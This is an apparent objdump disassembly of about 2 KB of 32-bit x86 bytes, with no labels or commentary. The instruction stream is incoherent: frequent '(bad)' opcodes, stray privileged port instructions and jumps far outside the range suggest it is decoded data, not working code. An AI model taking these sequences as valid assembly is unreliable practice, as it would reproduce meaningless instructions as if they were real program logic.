  412850:	fld    DWORD PTR [eax]
  412852:	jb     0x4127de
  412854:	mov    ebp,0xc84b0714
  412859:	push   cs
  41285a:	pop    fs
  41285c:	icebp  
  41285d:	add    BYTE PTR [ecx+0x77],ah
  412860:	ror    DWORD PTR ds:0xadd6a69f,0xa6
  412867:	dec    ebp
  412868:	pusha  
  412869:	inc    ebp
  41286a:	sbb    eax,0xe774dafe
  41286f:	loop   0x41286a
  412871:	sti    
  412872:	push   0xffffffa6
  412874:	fld    QWORD PTR [edi+0x6ff135a6]
  41287a:	cmp    BYTE PTR [ecx-0x27],ah
  41287d:	mov    cl,0xe8
  41287f:	dec    ecx
  412880:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412881:	and    al,0xfa
  412883:	add    BYTE PTR [esi+0x5b],dh
  412886:	in     al,0xe9
  412888:	popa   
  412889:	(bad)  [ebx+0x2898265]
  41288f:	jmp    0x121af3f5
  412894:	shl    DWORD PTR [edi-0x61331701],1
  41289a:	cmp    al,0x83
  41289c:	push   ecx
  41289d:	jno    0x41282b
  41289f:	jns    0x412916
  4128a1:	fst    DWORD PTR [eax-0x2f]
  4128a4:	loopne 0x41289d
  4128a6:	(bad)  
  4128a7:	call   0x6b657e58
  4128ac:	popa   
  4128ad:	fld    DWORD PTR [eax]
  4128af:	rol    DWORD PTR [edi-0x40000f6],0x80
  4128b6:	and    dh,0xfa
  4128b9:	fild   DWORD PTR [eax]
  4128bb:	mov    DWORD PTR [ecx+eax*8-0x4b],ecx
  4128bf:	out    dx,al
  4128c0:	or     bl,ah
  4128c2:	add    BYTE PTR [ebp+0x82e87f],cl
  4128c8:	sti    
  4128c9:	fcmovnb st,st(6)
  4128cb:	add    bl,cl
  4128cd:	fwait
  4128ce:	inc    ebp
  4128cf:	jne    0x4128c3
  4128d1:	mov    ds:0xdbbb0102,eax
  4128d6:	mov    DWORD PTR [edi+ebx*4-0x34fff9b7],eax
  4128dd:	stos   DWORD PTR es:[edi],eax
  4128de:	mov    DWORD PTR [edi+0x5b],eax
  4128e1:	lods   eax,DWORD PTR ds:[esi]
  4128e2:	call   0x11c332a
  4128e7:	lea    eax,[eax]
  4128e9:	out    dx,eax
  4128ea:	out    0x18,eax
  4128ec:	push   0xffffff8a
  4128ee:	xor    ah,BYTE PTR [edx]
  4128f0:	mov    cl,0x13
  4128f2:	aam    0xe8
  4128f4:	in     eax,0xc1
  4128f6:	fiadd  DWORD PTR [eax]
  4128f8:	lea    edi,[edi-0x5eafe719]
  4128fe:	fld    TBYTE PTR [eax+0x4c]
  412901:	mov    bh,0xc7
  412903:	add    bh,bh
  412905:	outs   dx,BYTE PTR ds:[esi]
  412906:	adc    al,BYTE PTR [bx+si+0x7b]
  41290a:	add    BYTE PTR [ebx+0xdb4a60],0x85
  412911:	mov    ecx,DWORD PTR ds:0xfd650a81
  412917:	cli    
  412918:	push   0x3b
  41291a:	(bad)  
  41291b:	adc    al,ah
  41291d:	pop    ds
  41291e:	fwait
  41291f:	add    BYTE PTR [ebx+0x74f6853b],cl
  412925:	jno    0x4128ea
  412927:	sti    
  412928:	adc    eax,0x3d0e1b
  41292d:	bound  edi,QWORD PTR [ecx-0x77]
  412930:	push   esp
  412931:	arpl   ax,si
  412933:	add    BYTE PTR [ebx+0x3118c522],al
  412939:	and    dh,BYTE PTR [ecx+0x4f945034]
  41293f:	mul    ebx
  412941:	push   edx
  412942:	mov    al,0x4
  412944:	xchg   ebp,esp
  412946:	pushf  
  412947:	add    eax,DWORD PTR [eax]
  412949:	bound  edi,QWORD PTR [ebp-0x3c]
  41294c:	je     0x41294e
  41294e:	jl     0x412910
  412950:	loope  0x412907
  412952:	cs icebp 
  412954:	add    BYTE PTR [eax],al
  412956:	int    0x25
  412958:	mov    ebp,0x11f02210
  41295d:	mov    dh,0x99
  41295f:	jne    0x412925
  412961:	push   0x63
  412963:	jns    0x4128ee
  412965:	pop    eax
  412966:	arpl   ax,si
  412968:	add    BYTE PTR [eax+0x55],bl
  41296b:	cmp    eax,0xf00856b9
  412970:	loope  0x412945
  412972:	call   0x2f9f6b2a
  412977:	cmp    eax,DWORD PTR [esp+eax*8+0x107f6]
  41297e:	mov    eax,ds:0x13ec8e65
  412983:	outs   dx,BYTE PTR ds:[esi]
  412984:	mov    gs,edi
  412986:	adc    eax,0x621c6273
  41298b:	mov    BYTE PTR [edi],dh
  41298d:	std    
  41298e:	(bad)  
  41298f:	stc    
  412990:	loope  0x412a08
  412992:	jbe    0x41296b
  412994:	not    edi
  412996:	jb     0x4129c8
  412998:	add    DWORD PTR [ecx-0x76ff0b3c],eax
  41299e:	jg     0x412948
  4129a0:	idiv   BYTE PTR [edi]
  4129a2:	bound  ecx,QWORD PTR [eax+ecx*1-0xc264b03]
  4129a9:	loop   0x4129ba
  4129ab:	pop    edx
  4129ac:	pop    ebp
  4129ad:	or     BYTE PTR [edi],bl
  4129af:	(bad)  
  4129b0:	loopne 0x412994
  4129b2:	add    BYTE PTR [ebp+ebx*8-0x14da0732],cl
  4129b9:	daa    
  4129ba:	add    al,0xe3
  4129bc:	xchg   bl,dl
  4129be:	add    esi,DWORD PTR [esi-0x24]
  4129c1:	mov    dh,0x59
  4129c3:	dec    esi
  4129c4:	push   es
  4129c5:	xchg   esi,eax
  4129c6:	xchg   BYTE PTR [ecx+ebp*8-0x19],ch
  4129ca:	push   edi
  4129cb:	pop    ebp
  4129cc:	push   es
  4129cd:	adc    eax,0x43ebdef4
  4129d2:	cmc    
  4129d3:	xchg   ebp,eax
  4129d4:	fldcw  WORD PTR [edx+0x21]
  4129d7:	bound  ecx,QWORD PTR [ebp+0x68ce2eb]
  4129dd:	xchg   esi,eax
  4129de:	cmp    DWORD PTR [ecx],0x6
  4129e1:	out    0x57,eax
  4129e3:	ss push edx
  4129e5:	cmp    ebp,DWORD PTR gs:[ebp-0x5d7718fb]
  4129ec:	mov    esp,gs
  4129ee:	xor    ebx,DWORD PTR [edi+0x6204bb4e]
  4129f4:	(bad)  [esi-0x8]
  4129f7:	test   eax,0xdb03a7e8
  4129fc:	pop    esi
  4129fd:	fwait
  4129fe:	add    al,0x62
  412a00:	fldcw  WORD PTR [ebx+eax*8-0x12]
  412a04:	fst    QWORD PTR [edi-0x8deae1e]
  412a0a:	inc    ebx
  412a0b:	bound  edx,QWORD PTR [edx+0x65]
  412a0e:	aaa    
  412a0f:	pop    ebp
  412a10:	add    eax,0x8e2288e7
  412a15:	out    0x33,al
  412a17:	add    BYTE PTR [edi-0x11],cl
  412a1a:	pop    ss
  412a1b:	repz test ecx,ebx
  412a1e:	jb     0x4129a9
  412a20:	ret    0xda
  412a23:	jmp    0x76018289
  412a28:	fs test eax,0x5bd7befd
  412a2e:	sub    al,0x61
  412a31:	fld    DWORD PTR [ebx+0x31e4baa9]
  412a37:	into   
  412a38:	dec    ebx
  412a39:	test   eax,0xe7d9dcfd
  412a3e:	inc    eax
  412a3f:	jmp    0xe94101a0
  412a44:	popa   
  412a45:	lea    edx,[eax]
  412a47:	push   ss
  412a48:	sub    ebp,DWORD PTR [edi+0x12]
  412a4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a4c:	enter  0xff51,0xe8
  412a50:	popa   
  412a51:	push   es
  412a52:	adc    eax,ecx
  412a54:	int3   
  412a55:	les    eax,FWORD PTR [eax]
  412a57:	pop    esp
  412a58:	lock test edi,edi
  412a5b:	call   0xa39c1bc1
  412a60:	data16 fstp DWORD PTR [ebp+0x17]
  412a64:	test   eax,0xdf17511a
  412a69:	je     0x412a7b
  412a6b:	mov    esi,0x69b9064e
  412a70:	data16 fld DWORD PTR [eax]
  412a73:	ins    DWORD PTR es:[edi],dx
  412a74:	int3   
  412a75:	lea    ebp,[ebp+0x69]
  412a78:	add    bh,BYTE PTR [ebp+0x7200e910]
  412a7e:	dec    ebx
  412a7f:	ret    0xf5ee
  412a82:	inc    ebx
  412a83:	(bad)  
  412a84:	and    BYTE PTR [edx+edx*1],bh
  412a87:	mov    ch,bl
  412a89:	push   ecx
  412a8a:	pop    ecx
  412a8b:	cli    
  412a8c:	dec    ecx
  412a8d:	or     al,0xa1
  412a8f:	and    BYTE PTR [ebx],0x1
  412a92:	mov    edi,DWORD PTR [ecx+ebp*2]
  412a95:	xor    al,0x3a
  412a97:	jbe    0x412a88
  412a99:	loope  0x412a99
  412a9b:	mov    ds:0x848fc400,al
  412aa0:	sahf   
  412aa1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412aa2:	fld    QWORD PTR [eax]
  412aa4:	add    BYTE PTR [esi-0x3838782a],dh
  412aaa:	push   edi
  412aab:	mov    eax,ds:0x74d83b00
  412ab0:	add    dl,BYTE PTR [eax+0x1946881d]
  412ab6:	cmc    
  412ab7:	das    
  412ab8:	test   BYTE PTR [ebp+0x3e],bh
  412abb:	add    BYTE PTR [eax],al
  412abd:	sti    
  412abe:	stos   BYTE PTR es:[edi],al
  412abf:	or     cl,BYTE PTR [ebx-0x5c61a43c]
  412ac5:	or     ebx,eax
  412ac7:	add    BYTE PTR [ecx+edi*8+0x54],dh
  412acb:	mov    edi,0xe8083588
  412ad0:	pop    ss
  412ad1:	inc    edi
  412ad2:	pop    edx
  412ad3:	mov    al,ds:0x71d7cb00
  412ad8:	or     al,BYTE PTR [eax+0x11]
  412adb:	test   BYTE PTR [esi+0xd81a],bl
  412ae1:	add    BYTE PTR [edi+0x43c387dd],dh
  412ae7:	xchg   edx,eax
  412ae8:	adc    BYTE PTR [ebp+ebx*2-0x5cfe9528],al
  412aef:	call   0x9a492335
  412af4:	add    dh,BYTE PTR [eax+ecx*4+0x5c]
  412af8:	retf   
  412af9:	add    al,BYTE PTR [edi]
  412afb:	call   0x10cb:0x5c787404
  412b02:	pop    es
  412b03:	call   0x4cb:0x5c887410
  412b0a:	pop    es
  412b0b:	call   0x8cb:0x5c78740d
  412b12:	in     eax,0x55
  412b14:	ret    
  412b15:	pop    edi
  412b16:	bound  ecx,QWORD PTR [edx+0x3c]
  412b19:	ret    0xf066
  412b1c:	xor    eax,0xe5703689
  412b21:	clc    
  412b22:	jecxz  0x412af8
  412b24:	mov    ch,0x0
  412b26:	(bad)  
  412b27:	lock ss std 
  412b2a:	push   edi
  412b2b:	mov    esp,0xc0623ff3
  412b30:	fst    QWORD PTR [ebx]
  412b32:	inc    edx
  412b33:	or     al,0x41
  412b35:	add    bh,bl
  412b37:	xor    BYTE PTR [eax+0x65],bl
  412b3a:	(bad)  
  412b3c:	sub    BYTE PTR [ebx+esi*4],al
  412b3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b40:	push   0x5cdcae8b
  412b45:	dec    edi
  412b46:	add    BYTE PTR [eax+0x57fd30ee],cl
  412b4c:	or     al,bh
  412b4e:	aas    
  412b4f:	bound  esi,QWORD PTR [ebp-0x3c]
  412b52:	je     0x412b80
  412b54:	outs   dx,DWORD PTR ds:[esi]
  412b55:	pusha  
  412b56:	and    al,0x5e
  412b58:	mov    edx,0xf0384557
  412b5d:	(bad)  
  412b5e:	push   esp
  412b5f:	jle    0x412b6d
  412b61:	pushf  
  412b62:	mov    ebp,DWORD PTR [ebx]
  412b64:	dec    ebx
  412b65:	sub    al,0xe8
  412b67:	aaa    
  412b68:	call   0xed202b70
  412b6d:	sub    BYTE PTR [eax],cl
  412b6f:	cmp    BYTE PTR [eax+edx*4+0x4c],cl
  412b73:	inc    esi
  412b74:	sub    al,0xe9
  412b76:	xor    al,BYTE PTR [ebp-0x5d7cff0f]
  412b7c:	sub    eax,0x265abe25
  412b81:	inc    ebp
  412b82:	add    BYTE PTR [eax],dh
  412b84:	fimul  WORD PTR [ecx-0x25be7532]
  412b8a:	std    
  412b8b:	ins    DWORD PTR es:[edi],dx
  412b8c:	jl     0x412b52
  412b8e:	je     0x412beb
  412b90:	fldcw  WORD PTR [edx+0x11]
  412b93:	xchg   edx,eax
  412b94:	jne    0x412b39
  412b96:	add    ebx,DWORD PTR [esi-0x12]
  412b99:	fist   WORD PTR [ecx]
  412b9b:	xor    BYTE PTR [esi+0x1d],cl
  412b9e:	in     al,dx
  412b9f:	cmp    al,0x4
  412ba1:	push   es
  412ba2:	fistp  WORD PTR [esi+ecx*2+0x17234104]
  412ba9:	jmp    0x412bae
  412bab:	add    dl,dh
  412bad:	xlat   BYTE PTR ds:[ebx]
  412bae:	sub    al,bh
  412bb0:	pusha  
  412bb1:	push   ebp
  412bb2:	test   BYTE PTR [ebx+0x62],al
  412bb5:	dec    esi
  412bb6:	sub    BYTE PTR [eax],dh
  412bb8:	dec    ebx
  412bb9:	cwde   
  412bba:	or     ecx,DWORD PTR [ebx-0x731c424a]
  412bc0:	pusha  
  412bc1:	dec    esi
  412bc2:	sub    BYTE PTR [ebx+ecx*2],dl
  412bc5:	cwde   
  412bc6:	jge    0x84a4096c
  412bcc:	xchg   esi,eax
  412bcd:	fsub   st,st(7)
  412bcf:	add    esp,DWORD PTR [eax]
  412bd1:	fucom  st(7)
  412bd3:	cmp    bl,ch
  412bd5:	hlt    
  412bd6:	imul   ebp,edi,0x90b84e3a
  412bdc:	and    DWORD PTR ds:0x6ec64860,esi
  412be2:	xlat   BYTE PTR ds:[ebx]
  412be3:	nop
  412be4:	and    BYTE PTR [ebp-0xad66ee9],bh
  412bea:	pop    ss
  412beb:	lea    edx,[ecx]
  412bed:	icebp  
  412bee:	jle    0x412c38
  412bf0:	mov    ah,0xd7
  412bf2:	out    0x69,eax
  412bf4:	pusha  
  412bf5:	test   eax,0xd82e915e
  412bfa:	out    0x3,eax
  412bfc:	(bad)  
  412bfd:	jmp    0x412c56
  412bff:	test   DWORD PTR [ebp-0x27],0xeb7f03d1
  412c06:	imul   esi,edi,0x35
  412c09:	fld    DWORD PTR [eax]
  412c0b:	ins    BYTE PTR es:[edi],dx
  412c0c:	mov    eax,ds:0x620a8c
  412c11:	mov    cl,0x4d
  412c13:	dec    ebx
  412c14:	adc    DWORD PTR [ecx-0x42],ecx
  412c17:	and    ebp,eax
  412c19:	popa   
  412c1a:	sbb    cl,al
  412c1c:	mov    edi,0x6254f0d8
  412c21:	lahf   
  412c22:	jmp    0x4a5d2fb0
  412c27:	add    al,0xe8
  412c29:	popa   
  412c2a:	fnstenv [ecx]
  412c2c:	sbb    ecx,DWORD PTR [edx+ecx*2]
  412c2f:	add    al,ch
  412c31:	popa   
  412c32:	fldcw  WORD PTR [edx+0x4d]
  412c35:	pop    ecx
  412c36:	icebp  
  412c37:	inc    eax
  412c38:	add    al,0x61
  412c3a:	fld    DWORD PTR [ebx-0x2305557]
  412c40:	push   ebp
  412c41:	cmp    cl,ch
  412c43:	mov    DWORD PTR [ecx-0x2e31adc9],ebx
  412c49:	jnp    0x412c6d
  412c4b:	add    cl,ch
  412c4d:	cs lahf 
  412c4f:	ret    0x61e5
  412c52:	clc    
  412c53:	push   ebx
  412c54:	clc    
  412c55:	pusha  
  412c56:	fst    DWORD PTR [ebx+0x72]
  412c59:	rcr    BYTE PTR [edx-0x1c],cl
  412c5c:	xchg   ecx,eax
  412c5d:	loope  0x412c4c
  412c5f:	jnp    0x412c46
  412c61:	popa   
  412c62:	fst    DWORD PTR [ecx+0x1f]
  412c65:	ja     0x412cda
  412c67:	push   DWORD PTR [ecx-0x67]
  412c6a:	(bad)  
  412c6b:	adc    bh,BYTE PTR ds:0x1900c0b0
  412c71:	xchg   esp,ebp
  412c73:	mov    eax,0xd92100fb
  412c78:	xor    DWORD PTR [edx+0x53],eax
  412c7b:	push   esp
  412c7c:	xchg   esp,eax
  412c7d:	or     eax,0xe900d9f2
  412c82:	call   0x7c4173db
  412c87:	mov    bl,0xe8
  412c89:	popa   
  412c8a:	int3   
  412c8b:	fild   DWORD PTR [eax]
  412c8d:	lea    ecx,[edi]
  412c8f:	mov    cl,0x88
  412c91:	add    BYTE PTR [ebx-0x24],bh
  412c94:	call   0x116f9fb
  412c99:	test   BYTE PTR [ebx+0x3a5284ce],cl
  412c9f:	fadd   QWORD PTR [eax]
  412ca1:	mov    dl,0x3a
  412ca3:	dec    edi
  412ca4:	mov    WORD PTR [ebx+edi*1],fs
  412ca7:	fadd   QWORD PTR [eax]
  412ca9:	add    BYTE PTR [ebx-0x3f],dl
  412cac:	cli    
  412cad:	push   DWORD PTR [eax+ebx*2]
  412cb0:	ror    BYTE PTR [edi],0xbf
  412cb3:	leave  
  412cb4:	std    
  412cb5:	dec    DWORD PTR [ebx]
  412cb7:	sbb    eax,0x9c0e7811
  412cbc:	add    BYTE PTR [ebp-0x3f6e3345],al
  412cc2:	sbb    DWORD PTR [eax+0x1c8f0f24],0xb
  412cc9:	test   DWORD PTR [esp+ebx*8-0x377a0000],edx
  412cd0:	and    al,0x10
  412cd2:	jb     0x412c55
  412cd4:	add    BYTE PTR [eax],al
  412cd6:	retf   
  412cd7:	xrelease mov BYTE PTR [edi-0x76e30c00],cl
  412cde:	test   BYTE PTR [edi-0x44fffda5],bl
  412ce4:	retf   
  412ce5:	dec    ebp
  412ce6:	push   0xffffffcf
  412ce8:	ret    0xd8e8
  412ceb:	inc    esp
  412cec:	sbb    eax,0xa7fb84fb
  412cf1:	jl     0x412c80
  412cf3:	jg     0x412ca6
  412cf5:	adc    BYTE PTR [ebp+0x280b81f],cl
  412cfb:	mov    ebx,ebx
  412cfd:	push   eax
  412cfe:	mov    esp,DWORD PTR [edx-0x44]
  412d01:	jmp    0xdcd01feb
  412d06:	and    DWORD PTR [edx+0x1e6a663d],0x60
  412d0d:	xor    ecx,DWORD PTR [ebx+0x5148ce26]
  412d13:	adc    ch,BYTE PTR [edi+0x307463f6]
  412d19:	add    DWORD PTR [ecx-0x7b7212e2],eax
  412d1f:	xchg   BYTE PTR [eax+0x1],bh
  412d22:	add    BYTE PTR [edx+0x79],ah
  412d25:	inc    ebp
  412d26:	and    al,0xaa
  412d28:	test   DWORD PTR [ebp+0x24],eax
  412d2b:	jb     0x412d8d
  412d2d:	mov    es,WORD PTR [esi+eax*4+0x2c]
  412d31:	xor    DWORD PTR [ecx+0x71],edx
  412d34:	loop   0x412cc4
  412d36:	mov    WORD PTR [esi-0x7c],es
  412d39:	push   es
  412d3a:	add    BYTE PTR [edx-0x77],ah
  412d3d:	push   eax
  412d3e:	and    al,0x0
  412d40:	sahf   
  412d41:	sbb    BYTE PTR ds:0x7ff062d6,ch
  412d47:	shl    BYTE PTR [esi-0x32],0x6c
  412d4b:	mov    BYTE PTR [ecx-0x10],dl
  412d4e:	add    ch,bh
  412d50:	jbe    0x412d1e
  412d52:	adc    ch,bh
  412d54:	dec    edi
  412d55:	js     0x412d4d
  412d57:	aas    
  412d58:	bound  ecx,QWORD PTR [ebx-0x4f8f67f1]
  412d5e:	add    al,0xfd
  412d60:	push   esi
  412d61:	or     al,0xd
  412d63:	std    
  412d64:	lods   al,BYTE PTR ds:[esi]
  412d65:	dec    edi
  412d66:	push   eax
  412d67:	and    al,0x72
  412d69:	push   edi
  412d6a:	mov    dl,0xc6
  412d6c:	push   ds
  412d6d:	adc    al,0xa
  412d6f:	call   DWORD PTR [eax]
  412d71:	jecxz  0x412da8
  412d73:	push   0x12061
  412d78:	popf   
  412d79:	frndint 
  412d7b:	push   DWORD PTR [eax-0x67]
  412d7e:	out    0x8d,eax
  412d80:	cs mov ch,0xe6
  412d83:	or     DWORD PTR [ebx+0x2d3ad4d8],0xfffffffe
  412d8a:	jp     0x412dac
  412d8c:	push   cs
  412d8d:	(bad)  
  412d8f:	add    ebx,ecx
  412d91:	push   ebp
  412d92:	or     ebx,esp
  412d94:	(bad)  
  412d95:	(bad)  
  412d97:	xor    al,0x5f
  412d99:	inc    ebp
  412d9a:	retf   
  412d9b:	xlat   BYTE PTR ds:[ebx]
  412d9c:	(bad)  
  412d9d:	(bad)  
  412d9f:	mov    WORD PTR [esi+0x88c7b5],fs
  412da5:	sahf   
  412da6:	mov    ch,0xc7
  412da8:	xor    ebp,ebx
  412daa:	or     eax,0xb17e402e
  412daf:	outs   dx,BYTE PTR ds:[esi]
  412db0:	(bad)  
  412db1:	ins    BYTE PTR es:[edi],dx
  412db2:	fldcw  WORD PTR [esi]
  412db4:	inc    eax
  412db5:	jle    0x412d64
  412db7:	pop    ecx
  412db8:	(bad)  
  412db9:	pop    esp
  412dba:	fldcw  WORD PTR [esi+0x74c93e3f]
  412dc0:	std    
  412dc1:	dec    esp
  412dc2:	fldcw  WORD PTR [esi-0x6f3ac1c1]
  412dc8:	std    
  412dc9:	cmp    al,0xd9
  412dcb:	scas   al,BYTE PTR es:[edi]
  412dcc:	aas    
  412dcd:	ds shl edi,0xfe
  412dd1:	sub    al,0xd9
  412dd3:	scas   al,BYTE PTR es:[edi]
  412dd4:	aas    
  412dd5:	ds mov ebp,0xd99cfef5
  412ddb:	scas   al,BYTE PTR es:[edi]
  412ddc:	aas    
  412ddd:	jle    0x412d78
  412ddf:	outs   dx,BYTE PTR ds:[esi]
  412de0:	std    
  412de1:	mov    ecx,ds
  412de3:	jg     0x412d82
  412de5:	dec    edx
  412de6:	fsub   st,st(7)
  412de8:	xchg   ebp,eax
  412de9:	mov    ebp,0xb21f734c
  412dee:	fsub   st,st(7)
  412df0:	add    edi,DWORD PTR [edx-0x778dffa5]
  412df6:	sti    
  412df7:	mov    DWORD PTR [edx+0x72599f58],ebp
  412dfd:	and    BYTE PTR [ecx-0x13234b3f],0x80
  412e04:	dec    ebp
  412e05:	test   eax,0x5ec57
  412e0a:	xor    eax,0x309fda50
  412e0f:	push   esi
  412e10:	pop    esp
  412e11:	add    eax,0x6af7506a
  412e16:	test   BYTE PTR [ecx],al
  412e18:	or     eax,0xfcfce065
  412e1d:	jmp    0x6a43c90c
  412e22:	sub    ebp,edi
  412e24:	or     eax,0xfcfca06e
  412e29:	jmp    0xfd542c9e
  412e2e:	inc    esp
  412e2f:	mov    ebp,0x59117200
  412e34:	mul    dh
  412e36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e37:	cmp    edi,0xffffffe8
  412e3a:	popa   
  412e3b:	pop    edx
  412e3c:	dec    esp
  412e3d:	or     eax,0xde55fe12
  412e42:	std    
  412e43:	fcom   QWORD PTR [ebx]
  412e45:	sub    DWORD PTR [esi+0x5a],ebx
  412e48:	fs add eax,0x2d87fcf6
  412e4e:	inc    edx
  412e4f:	loope  0x412dd4
  412e51:	test   eax,0x1589c788
  412e56:	inc    edx
  412e57:	jmp    0xfd1f17c4
  412e5c:	cld    
  412e5d:	cmp    dl,BYTE PTR [eax-0x4306ed02]
  412e63:	mov    esp,0x849e6d00
  412e68:	adc    al,BYTE PTR [ecx]
  412e6a:	data16 aad 0x0
  412e6d:	add    BYTE PTR [eax],al
  412e6f:	retf   
  412e70:	lds    edx,FWORD PTR [esi+0x57]
  412e73:	sub    al,0xec
  412e75:	sub    al,0x15
  412e77:	jnp    0x412e4e
  412e79:	test   DWORD PTR [edi+eiz*4-0x14],ebx
  412e7d:	aas    
  412e7e:	cmp    ebx,DWORD PTR [edi+0x557c18dc]
  412e84:	dec    esi
  412e85:	pop    esp
  412e86:	and    al,0x8f
  412e88:	aaa    
  412e89:	sbb    BYTE PTR [edx-0x39],ch
  412e8c:	fdivr  st,st(3)
  412e8e:	mov    al,0x87
  412e90:	xlat   BYTE PTR ds:[ebx]
  412e91:	add    BYTE PTR [eax],al
  412e93:	sub    al,0x65
  412e95:	add    BYTE PTR [ecx],al
  412e97:	jnp    0x412e71
  412e99:	push   esi
  412e9a:	push   edi
  412e9b:	mov    esp,gs
  412e9d:	fcom   DWORD PTR [ebx+ecx*1]
  412ea0:	fadd   DWORD PTR [ebp-0x7ff7d8bc]
  412ea6:	clc    
  412ea7:	ins    BYTE PTR es:[edi],dx
  412ea8:	rol    BYTE PTR [ebp+eax*1+0x6800d84a],cl
  412eaf:	dec    ebx
  412eb0:	cld    
  412eb1:	cld    
  412eb2:	dec    ebx
  412eb4:	leave  
  412eb5:	sti    
  412eb6:	adc    eax,0x3ceb0b
  412ebb:	sbb    BYTE PTR [ecx-0x436fe3dc],0x24
  412ec2:	adc    BYTE PTR [edx-0x67],al
  412ec5:	and    al,0x14
  412ec7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ec8:	retf   
  412ec9:	sti    
  412eca:	adc    eax,0x3cecab
  412ecf:	jo     0x412e8d
  412ed1:	and    al,0x10
  412ed3:	add    BYTE PTR [ebx-0x4fffbab],dl
  412ed9:	(bad)  
  412eda:	push   esi
  412edb:	push   edi
  412edc:	or     al,0xeb
  412ede:	sub    al,0x15
  412ee0:	mov    edx,ebp
  412ee2:	jg     0x412edf
  412ee4:	in     eax,dx
  412ee5:	rol    BYTE PTR [ecx+ecx*8+0xf262],1
  412eec:	jmp    0xa5d4fa6
  412ef1:	out    dx,eax
  412ef2:	pop    es
  412ef3:	sub    edi,0xfffffff1
  412ef6:	add    BYTE PTR [eax],al
  412ef8:	cli    
  412ef9:	and    DWORD PTR [ebp+0x4a],ecx
  412efc:	jmp    0x31514fce
  412f01:	cmp    al,0xd8
  412f03:	adc    edi,DWORD PTR [esi]
  412f05:	push   es
  412f06:	inc    ecx
  412f07:	add    bl,bl
  412f09:	sub    eax,0xb1e71c1d
  412f0e:	or     BYTE PTR [ebx+eax*8-0x20ffff0f],al
  412f15:	xor    eax,0x5f12201d
  412f1a:	das    
  412f1b:	push   ebp
  412f1c:	pop    ebp
  412f1d:	es aad 0x14
  412f20:	mov    ds:0x5dc07df0,al
  412f25:	je     0x412eb3
  412f27:	add    BYTE PTR [edx-0x10],ah
  412f2a:	push   0x0
  412f2c:	xchg   ebp,eax
  412f2d:	retf   
  412f2e:	dec    ebp
  412f2f:	and    al,0x6e
  412f31:	ror    DWORD PTR [ebp+0x24],cl
  412f34:	jle    0x412f9e
  412f36:	add    DWORD PTR [eax+0x0],eax
  412f39:	(bad)  
  412f3a:	lock xlat BYTE PTR ds:[ebx]
  412f3c:	je     0x412f84
  412f3e:	inc    eax
  412f3f:	fcom   DWORD PTR [ebx]
  412f41:	(bad)  
  412f42:	std    
  412f43:	inc    eax
  412f44:	add    cl,bh
  412f46:	mov    ebp,DWORD PTR [ebx+0xf05a00]
  412f4c:	je     0x412fb4
  412f4e:	ffreep st(4)
  412f50:	jmp    0x249142a7
  412f55:	push   edx
  412f56:	loop   0x412f2d
  412f58:	adc    edi,DWORD PTR [esi]
  412f5a:	sbb    al,0x41
  412f5c:	add    cl,ah
  412f5e:	dec    eax
  412f5f:	aad    0x74
  412f61:	fst    DWORD PTR cs:[ecx]
  412f64:	add    al,0x5f
  412f66:	inc    edx
  412f67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f68:	xor    al,0x3a
  412f6a:	call   0xa2a33357
  412f6f:	mov    ?,ecx
  412f71:	jns    0x412f57
  412f73:	daa    
  412f74:	add    al,0xbb
  412f76:	cdq    
  412f77:	jb     0x412fc2
  412f79:	pop    edx
  412f7a:	retf   0xc33e
  412f7d:	in     eax,0x95
  412f7f:	ret    
  412f80:	and    esp,DWORD PTR [edi+0x42]
  412f83:	sub    ch,al
  412f85:	test   ecx,ebp
  412f87:	jo     0x412fc9
  412f89:	ds mov cl,0xc1
  412f8c:	add    ebp,ecx
  412f8e:	xchg   ebp,eax
  412f8f:	add    esp,DWORD PTR [eax]
  412f91:	mov    ch,0xee
  412f93:	(bad)  
  412f94:	mov    WORD PTR [esi],ds
  412f96:	mov    ch,0xf7
  412f98:	xor    ebx,ebx
  412f9a:	and    dh,BYTE PTR [eax+0xc]
  412f9d:	add    al,cl
  412f9f:	xchg   ebp,eax
  412fa0:	out    0x8c,eax
  412fa2:	mov    dh,0xb5
  412fa4:	shr    ebx,cl
  412fa6:	xchg   ecx,eax
  412fa7:	jmp    esi
  412fa9:	add    edi,DWORD PTR [ebx]
  412fab:	int    0x16
  412fad:	adc    DWORD PTR [edx+0x6f],ebx
  412fb0:	mov    ds:0xcfe43703,eax
  412fb5:	out    dx,eax
  412fb6:	ins    DWORD PTR es:[edi],dx
  412fb7:	fsin   
  412fb9:	adc    BYTE PTR [esi+0x6f],cl
  412fbc:	stos   DWORD PTR es:[edi],eax
  412fbd:	add    ebx,DWORD PTR [edi]
  412fbf:	in     al,0x37
  412fc1:	repnz push ebp
  412fc3:	fstp   DWORD PTR [edx]
  412fc5:	les    ebp,FWORD PTR [edi+0x18b429b]
  412fcb:	pushf  
  412fcc:	test   eax,0x62a4fdff
  412fd1:	out    0xe3,eax
  412fd3:	in     al,dx
  412fd4:	dec    edx
  412fd5:	into   
  412fd6:	popa   
  412fd7:	leave  
  412fd8:	dec    ebx
  412fd9:	inc    eax
  412fda:	(bad)  
  412fdb:	aad    0x0
  412fdd:	cmp    eax,0x1484f18b
  412fe2:	pop    edi
  412fe3:	fld    DWORD PTR [ecx+ebp*4-0x16954ae3]
  412fea:	fisub  DWORD PTR [ebp-0x6e15af64]
  412ff0:	xor    eax,0x54d2c9c0
  412ff5:	call   0xd9b42c5b
  412ffa:	ficom  DWORD PTR [ebp-0x32cd8964]
  413000:	std    
  413001:	hlt    
  413002:	add    BYTE PTR [ecx-0x57],ch
  413005:	std    
  413006:	cld    
  413007:	leave  
  413008:	in     al,0x40
  41300a:	jmp    0xdd3efb87
  41300f:	jno    0x41300d
  413011:	jb     0x412ff0
  413013:	mov    WORD PTR [ebp+0x25724608],es
  413019:	adc    al,0xa9
  41301b:	popa   
  41301c:	adc    al,dl
  41301e:	in     eax,0x61
  413020:	out    dx,eax
  413021:	add    bh,cl
  413023:	mov    ebp,0x9ded009d
  413028:	out    0xe8,al
  41302a:	fist   WORD PTR [edx+0x216dfcf8]
  413030:	outs   dx,BYTE PTR ds:[esi]
  413031:	push   es
